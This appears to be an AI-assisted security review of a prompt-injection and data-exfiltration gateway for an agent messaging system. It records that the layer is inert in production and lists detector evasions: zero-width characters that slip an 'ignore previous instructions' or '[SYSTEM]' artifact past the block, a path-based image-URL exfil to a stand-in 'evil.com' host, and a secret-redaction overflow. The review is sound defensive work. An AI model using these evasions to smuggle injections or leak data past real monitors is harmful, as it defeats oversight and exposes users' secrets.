---
name: M9 Security Review — Fable 5
type: review
date: 2026-07-08
topics: [security-architecture, prompt-injection, redaction, gateway, governance, code-review]
status: source-review-complete
authorship: "Batch 1 ONLY was Fable 5. From Batch 2 onward — including every CRITICAL/MEDIUM/LOW finding and the SUMMARY — the reviewer was Opus 4.8. Anthropic force-downgraded the model off Fable 5 once it detected the cybersecurity context. The filename keeps the Fable 5 name but the bulk of this review is Opus 4.8's work, NOT Fable 5's."
headline: "CRITICAL — M9 is inert in the shipped daemon (passthrough default; the sidecar is wired only in tests). Plus 4 MEDIUM detector/seam evasions. See SUMMARY at the end."
description: >
  Adversarial security review of the M9 security-and-governance-gateway implementation,
  as it stands on the m9-build branch (both repos). This document IS the work product —
  append findings here incrementally, one at a time, as you go. Do not hold findings in
  your head until the end of the review; the session may be cut off at any point on a
  low context/quota budget, and only what is written to this file will survive.
---

# M9 Security Review — Fable 5

## Read this first

- **Append after every file or module you finish, not after the whole review.** Running
  quota is very limited for this task. Assume you can be cut off after any single tool
  call. If you have not written a finding (or a "reviewed, nothing found" checkbox tick)
  to disk, it does not exist for the next person who reads this.
- **You do not need to commit.** Just save this file (Edit/Write) after each increment.
  Uncommitted changes in a worktree are fine and expected here.
- **The branch is intentionally far behind `main`.** Do not flag "this is behind main" or
  suggest a rebase/merge — that is explicitly out of scope and will be handled separately.
  You are reviewing the security/governance design and implementation **as it exists on
  `m9-build`**, on its own terms.
- **Your job is narrow: find security holes, not style issues.** The question is: *does
  this security/governance layer have a mistake in it that would let something bad
  through, or that undermines one of the invariants below?* Style, naming, test coverage
  gaps that are already self-documented as deferred (see "Known self-flagged risk areas")
  are lower priority than a real bypass, a fail-open path, a logic inversion, or a place
  where the enforcement can be skipped/raced/starved.
- Read the two intent documents in this same folder if you want the full design
  rationale: `overview.md` and `M9-DEFINITION-OF-DONE.md`. They're already summarized
  below — you likely don't need to re-read them in full.

## What M9 is (one paragraph)

M9 is CELLO's security/governance layer: a **separate gateway process** every message
passes through. Inbound messages are sanitized and scanned for prompt injection before
the agent ever sees them. Outbound messages (`cello_send`) are scanned for secrets, PII,
and exfiltration patterns before they leave the machine. The gateway is deliberately a
process boundary the daemon cannot bypass — in a company deployment the employee controls
the daemon but *not* the gateway (INV-4). Every message produces a hash-chained local
record of what the gateway did to it (Phase 1); Phase 2 (not built) attests those records
to the directory for tamper-evidence.

## Setup — confirmed state (2026-07-08)

Two repos are involved. **The actual gateway code lives in `cello-client`, not
`trustless-cello`.** The `trustless-cello` M9 folder (this folder) is planning/journal
docs only — read it for intent, but there is no gateway code here.

| Repo | Worktree | Branch | Status |
|---|---|---|---|
| `cello-client` | `/Users/andrep/Documents/code/cello-client-m9` | `m9-build` | clean, up to date with origin |
| `trustless-cello` | `/Users/andrep/Documents/code/trustless-cello-m9` | `m9-build` | clean, up to date with origin (docs only) |

**Important nuance:** in `cello-client`, `m9-build` is already an ancestor of `main` (fully
merged, 192 commits ago as of this writing) — `main` has since moved on with unrelated
M8C work. So "the branch" for review purposes is not `main...m9-build`; it's the M9 work
itself, isolated by diffing from the commit *before* M9 started:

```bash
cd /Users/andrep/Documents/code/cello-client-m9
BASE=78d0191^   # = dfb0c31 "test(m9): give DOD-MSG-4 ordering-record verification teeth" — last pre-M9 commit
git diff $BASE m9-build --stat      # full stat
git diff $BASE m9-build -- <path>   # diff for one file
```

62 files changed, 6438 insertions(+), 37 deletions(-). Everything under `core/gateway/`
is a brand-new package (all `A`dded) — for those, reading the full current file is
equivalent to reading the diff (there's no prior version to diff against) and gives
better context (imports, full function bodies). For the four touched files outside
`core/gateway/`, the diff is what matters — they are large pre-existing files and you
should not try to read them whole.

## Review scope, prioritized

Tick each box as you finish it and append a finding (or a one-line "reviewed, nothing
found") to the Findings Log below **before moving to the next row**.

### Tier 1 — detectors and screen composition (the actual security logic)

- [ ] `core/gateway/src/detect/sanitize.ts` (219 lines) — Layer-1 deterministic sanitizer: invisible-char strip, RE2 patterns, entropy scoring, encoded-payload decode, special-token strip, size cap
- [ ] `core/gateway/src/detect/injection-patterns.ts` (57) + `injection-scanner.ts` (63) — Step-9 injection matcher + verdict logic (score≥70 block / ≥35 flag / <35 pass)
- [ ] `core/gateway/src/detect/linear-regex.ts` (80) — the RE2 engine wrapper (native+wasm) — ReDoS-safety is the entire point of this file; verify it's actually used everywhere regex matching happens, not bypassed anywhere
- [ ] `core/gateway/src/detect/language.ts` (98) — inbound language allowlist (self-flagged: NOT wired to block yet, only detects — confirm this is really inert and not silently half-wired)
- [ ] `core/gateway/src/detect/secrets.ts` (100) + `gitleaks-rules.ts` (239) — outbound secret detection/redaction (222-rule dictionary + generic-entropy catch-all)
- [ ] `core/gateway/src/detect/pii.ts` (142) — outbound PII whitelist + warn logic — whitelist bypass is the highest-value target here
- [ ] `core/gateway/src/detect/exfil.ts` (89) — outbound exfiltration checks (invisible-char egress, encoded-payload, zero-click image-exfil, injection-artifact-in-output → block)
- [ ] `core/gateway/src/detect/rate-limit.ts` (87) — per-agent outbound rate limiter
- [ ] `core/gateway/src/detect/model-installer.ts` (107) + `deberta-model-manifest.ts` (27) — consent-gated model download (DeBERTa scanner is NOT live yet — part 2 deferred; check the installer itself doesn't introduce a supply-chain hole, e.g. unpinned hash, no integrity check, path traversal on install)
- [ ] `core/gateway/src/screen/inbound.ts` (160) — composes sanitizer → verdict for the inbound path; this is where a missing check or wrong ordering would matter most
- [ ] `core/gateway/src/screen/outbound.ts` (237) — composes secrets → PII → exfil → rate-limit into one §6 verdict; same concern — ordering, short-circuits, whether every detector's result is actually consulted before "allow"

### Tier 2 — governance channel, config, records (the enforcement plumbing)

- [ ] `core/gateway/src/protocol.ts` (94) — the wire protocol between daemon and gateway; look for any field that lets the daemon side dictate the verdict rather than just carry it
- [ ] `core/gateway/src/client.ts` (207) — `SecurityGatewayClient`, the daemon-side caller — this is exactly the kind of code where a caching bug, a wrong default, or an exception-swallow could turn "block" into "allow" (fail-open)
- [ ] `core/gateway/src/server.ts` (175) — the gateway-side server handling requests; check the never-hang/deadline logic (INV-6) actually terminates in "block", not "allow", on timeout
- [ ] `core/gateway/src/config/config-store.ts` (236) — versioned config store; tighten-free / loosen-needs-confirmation is the core invariant here — verify loosening truly cannot happen without the confirmation step, including via race or partial-write
- [ ] `core/gateway/src/records/record-store.ts` (168) — hash-chained local records; verify the chain actually binds content+direction+correlationId (per the DoD, this was a fixed finding — confirm the fix holds) and that a missing/skipped record isn't possible on any code path
- [ ] `core/gateway/src/spawn.ts` (106) — how the daemon spawns the gateway subprocess; check for injectable args/env, and what happens if spawn fails (fail-open vs fail-closed)
- [ ] `core/gateway/src/bin/cello-gateway.ts` (179) — the gateway's own entrypoint/CLI wiring
- [ ] `core/gateway/src/index.ts` (68) + `passthrough.ts` (23) — package exports and the no-op passthrough mode; confirm passthrough mode cannot be accidentally selected in a real deployment (it should only exist for the M9-CORE-001 skeleton test)
- [ ] `core/gateway/src/types.ts` (144) — shared types; skim for anything that models a verdict as optional/nullable in a way that could default to "allow"

### Tier 3 — the daemon seam (where the gateway actually gets wired in — diff only, files are huge)

- [ ] `git diff $BASE m9-build -- core/daemon/src/daemon.ts` — confirm every inbound content path (direct, recovered-park, held-release per INV-5) actually routes through `ingestReceivedContent` → the gateway, with no shortcut
- [ ] `git diff $BASE m9-build -- core/daemon/src/session-node-manager.ts` — same concern from the session-management side
- [ ] `git diff $BASE m9-build -- core/adapter-claude-code/src/bin/cello-mcp.ts` — confirm `cello_send` cannot reach the wire without going through `screenOutbound` first
- [ ] `git diff $BASE m9-build -- core/daemon/src/types.ts`

### Tier 4 — tests (only as corroboration, not the primary target)

Tests are useful for confirming your reading of the detector logic, and for spotting
gaps the tests themselves reveal (e.g. a described behavior with no corresponding test).
Do not spend the bulk of the budget here; Tier 1–3 is where an actual security mistake
would live. If a Tier 1/2 file's behavior is unclear, its paired test file is the fastest
way to confirm what it actually does — use it as a reading aid.

## Known self-flagged risk areas (from M9-DEFINITION-OF-DONE.md — check these FIRST)

These are called out in the project's own DoD as incomplete, deferred, or partially wired.
A self-flagged gap is exactly where a real hole is most likely to hide — check whether the
"deferred" boundary is actually clean, or whether it leaks into something that's claimed done.

1. **FEED-001 increment 4 — the re-send flow (`redact` / `allow_once` / `allow_always`,
   `governance_decisions`, gated by `autonomous_override`) is explicitly marked
   "security-critical, deferred to a focused effort + adversarial review."** If any part
   of this is actually present in the code (even partially), it has NOT had that
   adversarial review yet. This is the single highest-value target in the whole review.
2. **M9-IN-002 part 2 (real DeBERTa inference) is deferred** — the scanner verdict logic
   (`injection-scanner.ts`) exists and is pluggable, but "absent model → Layer-2 off,
   graceful" is the claim. Verify "off" really means off (no false sense of coverage) and
   that a missing/corrupt model can't be misread as a "clean" verdict rather than "scanner
   unavailable."
3. **M9-IN-003 (language allowlist) detects but is "NOT yet wired live"** — confirm it
   truly has zero effect on the live path today, i.e. it can't accidentally short-circuit
   something else while "not wired."
4. **IN-001 breadth caveat**: only the confusables-redact check is claimed live in the
   real-process gate test; the other ~6 sanitizer checks are "unit only." Check whether
   they're actually wired into `screen/inbound.ts`'s live composition or only exercised in
   isolation by their own unit tests.
5. **OUT-001 breadth caveat**: only the AWS-key rule is claimed live in the real-process
   gate; the other 221 gitleaks rules + entropy catch-all are "unit only." Same check as
   above — wired into `screen/outbound.ts` or not?

## Invariants (the acceptance bar — verbatim from the DoD)

- **INV-1 — No-LLM base.** Deterministic detection; DeBERTa is the only model, in-process; no network calls in the base path.
- **INV-2 — Not a moderation tool.** No toxicity/sentiment/bias/emotion/topic policing. Identity, injection, and data-exfiltration defense only.
- **INV-3 — Deterministic base (Phase 1) vs LLM-judgment (Day 2).** Judgment calls are out of the base pipeline entirely.
- **INV-4 — The gateway is the enforcer; it owns its own config and records** (separate SQLCipher file/key from the daemon). In a company setup the employee controls the daemon but not the gateway.
- **INV-5 — Unified daemon seam.** All inbound passes `ingestReceivedContent`; all outbound passes `cello_send`. No content path goes around the gateway.
- **INV-6 — The feedback channel never lies and never hangs.** Every `cello_send` returns a terminal verdict within a deadline; timeout = a block verdict, not a hang.
- **INV-7 — Error discipline.** Distinct code per failure cause, real error text (never `[object Object]`), actionable `guidance`, injected logger (no `console.log`), `domain.noun.verb` events.
- **INV-8 — Sovereign nodes (Phase 2, not built yet)** — not in scope for this review; the directory attestation table doesn't exist yet.

A violation of any of INV-1 through INV-7 in the code that's actually built is a finding.

## Findings Log

Append one entry per finding, in the format below, as soon as you find it — do not batch.
If a tier/file turns up nothing, still add a one-line "reviewed — no issue found" entry so
progress is visible to whoever resumes this.

```
### [SEVERITY: CRITICAL|HIGH|MEDIUM|LOW|INFO] <short title>
- **File:** path:line
- **Invariant/behavior violated:** which INV, or which claimed behavior
- **What's wrong:** concrete description
- **How it could be exploited / what breaks:** concrete scenario
- **Confidence:** certain / likely / worth a second look
```

<!-- FINDINGS START BELOW THIS LINE — do not remove this marker -->

> **AUTHORSHIP (read before citing this review):** Only **Batch 1** (the `[INFO] Batch 1` entry
> near the bottom, plus its five "open items to verify") was written by **Fable 5**. Everything else
> in this findings log — the CRITICAL finding directly below, all MEDIUM/LOW findings, Batches 2–6,
> and the SUMMARY — was written by **Opus 4.8**, after Anthropic force-downgraded the model off
> Fable 5 on detecting the cybersecurity context. Attribute accordingly: the headline CRITICAL and
> the detector-evasion findings are Opus 4.8's, not Fable 5's.

### [SEVERITY: CRITICAL] The entire M9 security layer is INERT in the shipped daemon — production runs on the always-allow passthrough
<!-- ↓↓↓ everything from here is OPUS 4.8 ↓↓↓ -->
- **File:** `core/daemon/src/bin/cello-daemon.ts:110-119` (the production composition root) vs
  `core/daemon/src/daemon.ts:680` (`config.securityGateway ?? new PassthroughGatewayClient()`).
- **Invariant/behavior violated:** the whole point of M9 — INV-5 (all content passes the gateway),
  INV-1/2 (screening), FEED-001 (governance). None of it runs in production.
- **What's wrong (verified, not inferred):** `cello-daemon.ts` — the binary `cello login` spawns as
  the real daemon — calls `startDaemon({...})` and NEVER sets `securityGateway`. In `daemon.ts` an
  absent `config.securityGateway` falls back to `PassthroughGatewayClient` (always returns `allow`),
  and startup logs `security.gateway.connected {mode:"passthrough"}`. A repo-wide grep confirms
  `spawnGatewaySidecar` and `LocalSidecarGatewayClient` are referenced ONLY in their own
  definitions/exports and in TEST files (`m9-gate-1.test.ts`, `m9-core-001-seam.test.ts`,
  `gateway-sidecar.test.ts`). No production code spawns the gateway sidecar or constructs the sidecar
  client. `cello-daemon.ts` was not even touched by the M9 diff.
- **Consequence:** a shipped daemon performs ZERO screening. Every outbound message sends unredacted
  (secrets, PII, exfil all pass); every inbound message is delivered unsanitized (injection markers,
  smuggled Unicode, oversized content all pass). The detectors, the fail-closed client, the config
  store, the records — all correct, all dormant. The M9-GATE-1 "green" result proves the layer works
  when the TEST HARNESS wires the sidecar; it does not prove the shipped `cello-daemon` binary wires
  it, and it doesn't.
- **Why this is the headline finding:** the DoD calls Phase-1 "launch-complete, 11/12 gate-green."
  That is true of the gate test's wiring, NOT of the production binary. If this ships as-is, CELLO
  markets a security/governance layer that is switched off in every real install. This is precisely
  a launch-triage "fundamentally ruins trust" item, not a forgivable papercut.
- **Fix (the missing integration step):** at daemon startup (in `cello-daemon.ts` or a helper
  `startDaemon` calls), spawn the gateway sidecar (`spawnGatewaySidecar`), construct a
  `LocalSidecarGatewayClient` on its socket, pass it as `config.securityGateway`, and — critically —
  decide the failure posture: if the sidecar can't be spawned, does the daemon refuse to start
  (fail-closed at the process level) or run passthrough? Per INV-5/SI-001 it should NOT silently run
  passthrough. Recommend: production requires the gateway; absence is a startup error, not a
  degrade-to-open. (Also: the `mode:"passthrough"` log line is the only current signal that
  screening is off — easy to miss; a shipped daemon should not be ABLE to run passthrough outside
  tests/dev.)
- **Confidence:** CERTAIN. Verified by reading the composition root + a repo-wide grep for every
  sidecar wiring symbol.
- **One caveat to check (does not change severity):** confirm the `trustless-cello` server-side
  daemon/relay composition roots (a different repo) don't wire it either — but those are directory
  nodes, not the operator's message-screening daemon, so this client-side gap stands regardless.

### [INFO] Batch 1 reviewed — screen compositions + daemon↔gateway plumbing
<!-- ↓↓↓ THIS BATCH ONLY is FABLE 5's work. The five open items below were handed to Opus 4.8. ↓↓↓ -->
Files read in full: `screen/outbound.ts`, `screen/inbound.ts`, `client.ts`, `server.ts`.
Overall: the fail-closed design is correct and deliberate. Recording the positives and the
open items to verify in later batches.

**Confirmed sound:**
- `client.ts`: connect failure, socket error, write failure, response-decode failure, socket
  close, and per-call timeout ALL resolve to `failClosedVerdict(direction)` — never a hang,
  never a silent allow (INV-6). Both the connect and the per-call path have their own bounded
  timers. `close()` fails every pending call closed. This is the single most important place a
  fail-open could hide, and it doesn't. (Pending: confirm `failClosedVerdict` disposition is
  `block` in `types.ts` — the entire guarantee rests on that one default.)
- `server.ts`: a screen-fn throw is caught → `block` / `screen_error` with real guidance, not a
  silent allow (INV-7). Request-log write happens BEFORE the verdict (ordering). The `ALLOW_ALL`
  pass-through default only applies when no `screen` fn is injected — must confirm the live bin
  always injects the real pipeline (checked next).
- `screen/outbound.ts`: `block` (rate-limit or exfil injection-artifact) short-circuits and
  returns the ORIGINAL content (never the sent bytes). Ordering is secrets → exfil → PII, so a
  known credential gets a typed `[REDACTED:rule]` placeholder before exfil's generic entropy
  redactor would mask it opaquely. Rate limiter uses peek-then-commit: a slot is consumed only
  when the message actually reaches the wire (allow/redact), not on block/warn/re-send. Sound.
- `screen/inbound.ts`: order is sanitize → size-block → language → injection; language + Step-9
  run on the SANITIZED text so confusable-Latin is judged as Latin. Layer-2 is skipped when
  `available()===false`. Step-9 matches are `observe`, not block (INV-2, deliberate).

**Open items to verify in later batches (each could be a real hole):**
1. `types.ts` → `failClosedVerdict` MUST default to `disposition: "block"`. Verify literally.
2. INV-4: `autonomousOverride` defaults to `false` in `OutboundScreener`, but the live gateway
   bin sources it from somewhere. Confirm it comes from the gateway's OWN config (CFG-001 DB),
   NOT from anything the daemon/employee can set over the wire or via env the employee controls.
   This is the FEED-001-inc-4 re-send gate — the highest-value target per the DoD.
3. `injection-scanner.ts`: confirm a missing/corrupt model yields `available()===false`
   (Layer-2 OFF), and can never be misread as a "clean/pass" verdict (self-flagged risk #2).
4. Inbound `redact` bypass check: a `redact` verdict currently always carries transformed
   `content`. Confirm the DAEMON SEAM fails closed (does NOT deliver the original unsanitized
   bytes) if a `redact`/`block` verdict ever arrives with `content` undefined.
5. Confirm the live bin injects the real screen pipeline (never leaves `server.ts` on ALLOW_ALL).

### [INFO] Batch 2 reviewed — types.ts, injection-scanner.ts, bin/cello-gateway.ts. Open items 1/2/3/5 RESOLVED sound.
- **Open item 1 RESOLVED — fail-closed is genuine.** `types.ts:130` `failClosedVerdict()`
  hardcodes `disposition: "block"` for both directions and both reason codes
  (`gateway_unavailable`, `governance_timeout`). The INV-6 guarantee is real.
- **Open item 3 RESOLVED — "no model" can never read as "clean".** `injection-scanner.ts`:
  `available()` = `#classifier !== null`; `scan()` early-returns `{available:false}` with no
  score/verdict when there's no classifier. `inbound.ts` gates on `available()` and only blocks
  on `verdict === "block"`. A missing/corrupt model just skips Layer-2 (graceful, per design) —
  it is structurally impossible for absence to produce a pass/allow verdict. Sound.
- **Open item 5 RESOLVED — the live bin injects the real pipeline.** `bin/cello-gateway.ts:107`
  wires `OutboundScreener`/`InboundScreener` into `createGatewayServer({screen})`. The
  `ALLOW_ALL` pass-through is only the no-arg default; production never hits it.
- **Open item 2 (INV-4 override gate) — PARTIALLY resolved, one nuance to note, one still open.**
  The `autonomousOverride` gate in `#resolvePII` (outbound.ts) holds regardless of what the daemon
  sends: even if the daemon puts `allow_once`/`allow_always` in `governanceDecisions`, with
  override OFF every such item is REJECTED → re-warn. So a compromised daemon cannot self-authorize
  PII egress over the wire. Good. **Nuance (not a finding for Phase 1):** in the bin, both
  `autonomous_override` and `pii_whitelist` are sourced from the gateway config store first, then
  fall back to env vars (`CELLO_GATEWAY_AUTONOMOUS_OVERRIDE=1`, `CELLO_GATEWAY_PII_WHITELIST`). In
  Phase-1 local-sidecar the operator controls both the env and the config DB — which is fine,
  because the Phase-1 trust boundary is "the operator's own machine." INV-4's employee-can't-touch-
  the-gateway property is a Phase-2 (remote gateway) concern and is out of scope here. **STILL OPEN
  (next batch):** the whole gate reduces to "can something set `autonomous_override=true` or extend
  `pii_whitelist` WITHOUT the loosen-confirmation step?" → must verify `config-store.ts` treats both
  as a *loosening* that requires confirmation (CFG-001's core invariant). This is now the linchpin.
- **New observation (benign):** outbound records store `sha256(req.content)` = the ORIGINAL
  pre-redaction bytes; inbound records likewise. Correct for audit (proves what the agent tried to
  send / what arrived). Not a hole.

### [INFO] Batch 3 reviewed — config-store.ts + pii.ts. Open item 2 (linchpin) RESOLVED sound. Two LOW hardening gaps + coverage notes below.
**config-store.ts — the loosen-confirm gate is correctly enforced (linchpin resolved):**
- First-set of any key is classified against the TIGHTEST `BASELINE` (autonomous_override=false,
  pii_whitelist=[], rate cap absent, etc.), so first-enabling override or seeding a whitelist is
  gated exactly like any later loosening — the obvious bypass (treat first-set as free "neutral")
  is explicitly closed (B1).
- Every loosening direction is caught: `membershipDirection` flags ANY added member as loosen even
  if a member is simultaneously removed (can't sneak a value in by swapping); raising/removing the
  rate cap loosens; SHRINKING the rate window loosens (H2); enabling override loosens. `direction===
  "loosen" && !confirmed` → rejected and NOT versioned. Unknown keys throw. Type-confused values throw
  (VALIDATORS) so a wrong-typed value can't silently disable a guard (M2).
- Fingerprint binds `direction` + `confirmed` into the hash chain (H1), so an editor can't flip
  confirmed 0→1 or relabel a loosen as neutral and still pass `verifyChain`.

**config-store.ts — LOW hardening gap #1 (worth flagging): the gateway never calls `verifyChain`
at startup.** `bin/cello-gateway.ts` reads config via `config.get(key)`, which returns the latest
value with NO chain verification. An actor with write access to the gateway's config DB file could
edit a value (or inject a loosening the gate would have rejected) and the running gateway would trust
it at next boot. The tamper-evidence chain exists but is not consulted by the enforcer itself. Real
defense is Phase-2 directory attestation (M9-ATTEST-001, not built) + the fact that in Phase-1 the DB
is on the operator's own trusted machine. Recommendation: call `verifyChain` for each key at gateway
boot and refuse to start (or fall back to BASELINE) on a broken chain. Severity LOW (requires
gateway-host DB write access; not exploitable by the daemon over the wire).

**config-store.ts — INFO: config is read ONCE at gateway startup**, not re-read at runtime. A
loosening confirmed via the portal doesn't take effect until the gateway restarts. This is fail-SAFE
(a runtime loosening is delayed, never applied early), so it's a UX note, not a hole.

**config-store.ts — INFO: `#latestRow` read happens OUTSIDE `BEGIN IMMEDIATE`.** The comment claims
the read-modify-write is one transaction; it isn't quite. But the `PRIMARY KEY (key, version)`
constraint means a concurrent double-write collides and the second writer THROWS (rollback), rather
than silently corrupting or dropping a loosening. Safe (fails loud), comment slightly overstates it.

**pii.ts — the whitelist gate is sound; misses are coverage limits, not logic bugs:**
- Whitelist is matched on the exact normalized value (email→lowercase, phone→digits). Non-whitelisted
  PII → warn; with `autonomous_override` OFF a warn can never be self-authorized out. No bypass of the
  egress gate. Empty-string whitelist entries match no real candidate (benign).
- **LOW/coverage:** the regex detectors have inherent blind spots — obfuscated email ("user [at]
  example.com"), 7-digit local phone numbers without area code (the phone regex needs ≥9 chars so
  short numbers don't match). This is best-effort PII *warning* by design (DoD scopes PII as warn, not
  a hard guarantee), and an agent actively obfuscating to exfiltrate is the exfil/injection layer's
  job. Note as a known limitation, not a defect.
- **INFO:** `flagId` is a 48-bit truncated sha256(category:value). Only load-bearing when
  `autonomous_override` is ON (operator opt-in); with it OFF a colliding flagId still can't let a
  value out. Marginal even when ON. Note only.

**Linchpin verdict:** the PII-egress / autonomous-override path is gated correctly end-to-end
(screener default OFF → wire can't override → config loosening requires confirmation → confirmation
binds into the tamper chain). The one concrete hardening ask is verifyChain-at-boot (LOW).

### [SEVERITY: MEDIUM] Outbound injection-artifact BLOCK is evadable with a zero-width character
- **File:** `core/gateway/src/detect/exfil.ts:57` (order of steps 1 vs 2 in `screenOutboundExfil`)
- **Invariant/behavior violated:** OUT-003 "an injection artifact in output → block the message"
  (a hijacked-agent compromise signal). The block can be bypassed AND the cleaned output still
  carries the artifact.
- **What's wrong:** step 1 runs `findInjectionArtifact(text)` on the RAW decoded bytes, and only
  step 2 runs `stripInvisible`. The artifact literals (`[SYSTEM]`, `ignore previous instructions`,
  …) are matched with exact/native regex. Inserting an invisible codepoint the sanitizer is known
  to strip — e.g. `[SYS​TEM]` (zero-width space) — breaks the literal match at step 1 (no
  block), then step 2 strips the zero-width, leaving a clean `[SYSTEM]` in the outgoing `text`,
  which is then SENT as a `redact` (because `inv.removed > 0`). The strip must happen BEFORE the
  block check (inbound gets this order right; outbound has it inverted).
- **How it could be exploited:** a compromised local agent emits `ign​ore all previous
  instructions ...` → the OUT-003 block that is supposed to stop a hijacked agent from attacking
  the peer is skipped, and the peer receives the de-obfuscated injection string. (Backstop: the
  peer's own inbound sanitizer strips markers — so this is a defeat of a defense-in-depth block,
  not a full end-to-end injection. Hence MEDIUM, not HIGH.)
- **Confidence:** certain (the ordering is plainly block-then-strip; re-check after strip is absent).

### [SEVERITY: MEDIUM] Path-based image-URL exfil is not caught (only `?`-query URLs)
- **File:** `core/gateway/src/detect/exfil.ts:74-80` (MD_IMAGE neutralizer) + `sanitize.ts:141`
  (`ENCODED_CHARSET`)
- **Invariant/behavior violated:** OUT-003 zero-click image-exfil neutralization.
- **What's wrong:** the neutralizer only rewrites a markdown image URL when `url.includes("?")`.
  An exfil payload carried in the PATH rather than the query — `![](http://evil.com/<base64data>)`
  — is passed through untouched. It also evades the high-entropy backstop, because the entropy
  scanner only flags tokens matching `^[A-Za-z0-9+/=_-]+$`, and a full URL contains `:` `/` `.`,
  so the URL token never qualifies as a high-entropy blob.
- **How it could be exploited:** a compromised agent encodes stolen data into the path segment of
  an auto-fetched image URL; neither the image check nor the entropy check fires, so it exfiltrates
  on send (zero-click if the recipient renders markdown).
- **Confidence:** certain that both checks miss it; the real-world impact depends on whether the
  recipient auto-renders markdown images (unknown in this protocol — worth confirming).

### [SEVERITY: MEDIUM] Outbound exfil matches adversary-controlled content with NATIVE RegExp, not RE2
- **File:** `core/gateway/src/detect/exfil.ts:34-38` (`ARTIFACT_PATTERNS`, `findInjectionArtifact`)
- **Invariant/behavior violated:** the project-wide RE2/ReDoS discipline (`linear-regex.ts` header:
  "used for ANY pattern that runs against adversary-controlled content"). Outbound content from a
  compromised agent IS adversary-controlled.
- **What's wrong:** `ARTIFACT_PATTERNS` are `RegExp` literals evaluated by the native V8 engine. The
  comment asserts they're "anchored / fixed alternations — linear time." The current three are
  probably backtrack-safe, but pattern 2
  (`\b(?:ignore|disregard)\s+(?:all\s+)?(?:your\s+)?previous\s+instructions\b`) has adjacent
  `\s+`/optional-`\s+` groups — a class of construct that is exactly what RE2 exists to make safe,
  and any FUTURE addition to this array silently inherits no ReDoS protection. The MD_IMAGE and PII
  regexes are likewise native (PII is explicitly "linear by construction," which is more defensible).
- **How it could be exploited:** a crafted outbound message that partially matches an artifact
  pattern could, now or after a future edit, peg the gateway CPU — which is both a DoS and a way to
  force `governance_timeout` (a fail-closed BLOCK, so not a bypass, but a self-inflicted outage
  vector). Recommendation: route `ARTIFACT_PATTERNS` through `LinearRegex` like the Step-9/gitleaks
  sets, or add a test that proves each pattern's linear time on a pathological input.
- **Confidence:** the current three are likely safe; the finding is the missing enforcement/guard,
  worth a second look on pattern 2 specifically.

### [INFO] Batch 4 — sanitize.ts + linear-regex.ts reviewed; notes
- **linear-regex.ts is sound.** Native `re2` preferred, `re2-wasm` hard-dependency fallback; both
  are real RE2 (linear-time). `initLinearRegex()` is awaited in the bin BEFORE traffic is accepted,
  and `LinearRegex` throws if constructed before init — so no pattern can silently run on a
  non-RE2 engine. Good.
- **sanitize.ts — LOW/documented: the confusables map is partial** (~60 Cyrillic/Greek pairs; full
  Unicode confusables.txt is a self-noted follow-up). An un-mapped lookalike survives normalization.
  Partial backstop: a message dominated by un-mapped non-Latin script trips the IN-003 language
  block; a MOSTLY-Latin string with a few un-mapped lookalikes can still read as "confident Latin"
  and be delivered with the lookalikes intact. Coverage limitation, not a logic bug.
- **sanitize.ts — INFO/by-design: encoded special-token markers are delivered un-stripped.**
  `stripSpecialTokens` runs on the pre-decode text; decoding is detection-only (`decodedForScan`),
  and a decoded marker only produces a Step-9 `observe`, never a strip/block (IN-002 semantic block
  is deferred). So `&#91;SYSTEM&#93;` is delivered literally and only observed. This is the stated
  decode-then-rescan tradeoff (don't corrupt legit URLs/code), acceptable while IN-002 is deferred,
  but worth stating plainly: **until IN-002 lands, encoded injection markers are surfaced, not
  blocked.**

### [SEVERITY: LOW] Secret redaction silently caps at 1000 matches per rule → overflow secrets leak
- **File:** `core/gateway/src/detect/secrets.ts:86` (`guard++ < 1000`) + no outbound size cap
- **Invariant/behavior violated:** OUT-001 "the delivered text never contains a detected secret
  value (SI-001)" / redact-by-default.
- **What's wrong:** the per-rule match loop is bounded at 1000 iterations (a loop-safety guard). Only
  the first ~1000 DISTINCT match spans for a given rule are collected into `secrets`; redaction then
  `split/join`s those collected values. Distinct secrets beyond the 1000th match of the same rule are
  never collected, so they pass through un-redacted. Compounding it: the OUTBOUND screener applies no
  size cap (the 1MB cap is inbound-only in `sanitize.ts`), so a single outbound message can carry far
  more than 1000 secrets.
- **How it could be exploited:** a compromised local agent packs >1000 distinct credentials of one
  type into one `cello_send`; the first 1000 are redacted, the remainder leave in the clear.
- **Confidence:** certain on the logic; low real-world likelihood (needs a deliberately crafted
  high-volume payload — a compromised-agent scenario, which is exactly the exfil threat model). Fix:
  redact all matches (RE2 global scan) and/or add an outbound size cap symmetric with inbound.

### [SEVERITY: LOW / needs-Andre-decision] The IN-003 language allowlist is LIVE and terminal-blocks all confident non-Latin inbound — the DoD says it is "NOT yet wired live"
- **File:** `core/gateway/src/screen/inbound.ts:93-108` vs `M9-DEFINITION-OF-DONE.md` (IN-003 row:
  "NOT yet wired live")
- **What's wrong (discrepancy, not a bug):** `inbound.ts` calls `screenInboundLanguage(deliveredText,
  this.#language ?? {})` UNCONDITIONALLY, and `!lang.allowed` returns a `terminal` block. The live bin
  constructs `new InboundScreener()` with no language options, so the DEFAULTS apply (allow only
  `latin`, minLetters 12, minShare 0.5). Net effect: **any inbound message that is confidently
  (≥50% of ≥12 letters) in a non-Latin script — Chinese, Arabic, Cyrillic, Hebrew, Hindi, Japanese,
  Korean — is terminally blocked and never delivered, in the live Phase-1 gateway.** The DoD text
  says this path is not wired; the code wires it. One of the two is stale.
- **Why it matters for launch:** this is a security-review observation with a product edge — it is a
  silent, hard drop of all non-English conversation. If any prospective user or their counterparty
  writes in another language, their agents cannot communicate. Worth an explicit Andre decision:
  intended (English-only launch) or an over-broad default that should ship as `observe`, not `block`.
- **Security note (the heuristic itself):** the script-share check is trivially evaded (keep it under
  12 letters, or dilute the non-Latin below 50% with Latin filler), so it is NOT a real injection
  defense — it is a coarse pre-filter, as the story states. That's acceptable for what it is; the
  concern is the false-POSITIVE (blocking legit languages), not a false-negative bypass.
- **Confidence:** certain the code path is live with blocking defaults; the DoD/code discrepancy is
  the actionable part.

### [INFO] Batch 5 — secrets / injection-patterns / record-store / spawn reviewed; the rest sound
- **secrets.ts** otherwise sound: all 222 rules compile through `LinearRegex` (RE2), keyword
  pre-filter, gitleaks FP layer (stopwords/allow-regex/entropy). A rule that fails RE2 compilation is
  skipped, not crashed (acceptable — reduces coverage, never fails open into a crash). Typed
  `[REDACTED:<rule>]` placeholders tell the agent what leaked.
- **injection-patterns.ts (Step-9) sound:** RE2 syntax only (no backreference/lookaround), compiled
  through `LinearRegex`, reported as `observe` (not auto-block) by design. Runs on the decoded form.
